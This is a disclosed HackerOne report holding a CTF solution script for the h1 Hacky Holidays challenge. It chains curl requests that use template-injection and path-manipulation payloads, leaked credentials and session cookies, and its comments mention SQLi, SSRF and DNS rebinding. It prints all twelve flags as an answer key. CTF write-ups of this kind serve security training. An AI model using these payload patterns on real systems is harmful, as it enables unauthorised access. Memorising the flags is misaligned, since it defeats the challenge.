# h1 hacky holidays CTF solution

## Report Details
- **Report ID**: 1065517
- **URL**: https://hackerone.com/reports/1065517
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-23T22:47:30.030Z
- **Disclosed**: 2021-01-11T22:24:38.757Z

## Reporter
- **Username**: erbbysam
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
Simple script to print all the flags. Full solution to follow (want to spend more time writing this, but am racing to be first 10 submissions):
```
echo "Flag 1 -- robots.txt"
curl https://hackyholidays.h1ctf.com/robots.txt 2>/dev/null | grep flag

echo ""
echo "Flag 2 -- js (descrambed -- flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} )"
diff <(curl https://hackyholidays.h1ctf.com/assets/js/jquery.min.js 2>/dev/null | js-beautify) <(curl https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js 2>/dev/null | js-beautify) | grep "h1"

echo ""
echo "Flag 3 -- /people-rater"
curl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= 2>/dev/null | grep flag

echo ""
echo "Flag 4 -- /swag-shop"
curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 2>/dev/null | grep flag

echo ""
echo "Flag 5 -- /secure-login (access:computer)"
wget -q https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip 2>&1 > /dev/null
unzip -P hahahaha my_secure_files_not_for_you.zip 2>&1 > /dev/null
cat flag.txt
rm my_secure_files_not_for_you.zip
rm flag.txt
rm xxx.png

echo ""
echo "Flag 6 -- /my-diary"
curl https://hackyholidays.h1ctf.com/my-diary/?template=secretadminsecretadminadmin.php.php.php 2>/dev/null | grep flag

echo ""
echo "flag 7 -- /hate-mail-generator"
curl -X POST https://hackyholidays.h1ctf.com/hate-mail-generator/new/preview --data 'preview_markup={{test}}{{email}}&preview_data={"test":"{{template:","email":"38dhs_admins_only_header.html}}"}' 2>/dev/null | grep flag


echo ""
echo "flag 8 -- /forum (grinch:BahHumbug)"
curl https://hackyholidays.h1ctf.com/forum/3/2 -H 'Cookie: token=9F315347A655FFDAF70CD4A3529EE8A6' 2>/dev/null | grep flag

echo ""
echo "flag 9 -- /evil-quiz"
curl -X POST https://hackyholidays.h1ctf.com/evil-quiz/admin --data 'username=admin&password=S3creT_p4ssw0rd-%24' 2>/dev/null | grep flag

echo ""
echo "flag 10 -- /signup-manager (signup age=1e3, lastname=YYYYYYYYYYYYYYY)"
curl https://hackyholidays.h1ctf.com/signup-manager/ -H 'Cookie: token=8fdaa7ac725a0f905e775a32a5cb7038' 2> /dev/null | grep flag

echo ""
echo "flag 11 -- /r3c0n_server_4fdk59 (SQLi, SQLi, ssrf, internal API ->grinchadmin:s4nt4sucks)"
curl -X POST https://hackyholidays.h1ctf.com/attack-box/login --data "username=grinchadmin&password=s4nt4sucks" --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null > /dev/null
curl https://hackyholidays.h1ctf.com/attack-box/ --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null | grep flag


echo ""
echo "flag 12 -- /attack-box (MD5(mrgrinch463+target), DNS rebind -> target=127.0.0.1)"
curl https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709 --cookie cookie.txt --cookie-jar cookie.txt 2>/dev/null | grep flag
rm cookie.txt
```

output:
```
Flag 1 -- robots.txt
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}

Flag 2 -- js (descrambed -- flag{b7ebcb75-9100-4f91-8454-cfb9574459f7} )
<         h1_0 = 'la',
<         h1_1 = '}',
<         h1_2 = '',
<         h1_3 = 'f',
<         h1_4 = 'g',
<         h1_5 = '{b7ebcb75',
<         h1_6 = '8454-',
<         h1_7 = 'cfb9574459f7',
<         h1_8 = '-9100-4f91-';
<     document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);

Flag 3 -- /people-rater
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}

Flag 4 -- /swag-shop
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}

Flag 5 -- /secure-login (access:computer)
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}

Flag 6 -- /my-diary
    <h4 class="text-center">flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}</h4>

flag 7 -- /hate-mail-generator
                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>

flag 8 -- /forum (grinch:BahHumbug)
                    <div class="well well-sm" style="margin:0;font-size:12px">We've launched our recon server, gathered intelligence and pin pointed Santa's location!<br>Not long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!<br><br><strong>flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}</strong></div>

flag 9 -- /evil-quiz
            <h3 class="text-center">flag{6e8a2df4-5b14-400f-a85a-08a260b59135}</h3>

flag 10 -- /signup-manager (signup age=1e3, lastname=YYYYYYYYYYYYYYY)
                <p class="text-center">flag{99309f0f-1752-44a5-af1e-a03e4150757d}</p>

flag 11 -- /r3c0n_server_4fdk59 (SQLi, SQLi, ssrf, internal API ->grinchadmin:s4nt4sucks)
        <h4 class="text-center">flag{07a03135-9778-4dee-a83c-7ec330728e72}</h4>

flag 12 -- /attack-box (MD5(mrgrinch463+target), DNS rebind -> target=127.0.0.1)
        <p><strong>flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}</strong></p>
```

## Impact

critical, we must stop the Grinch!

## Attachments
No attachments
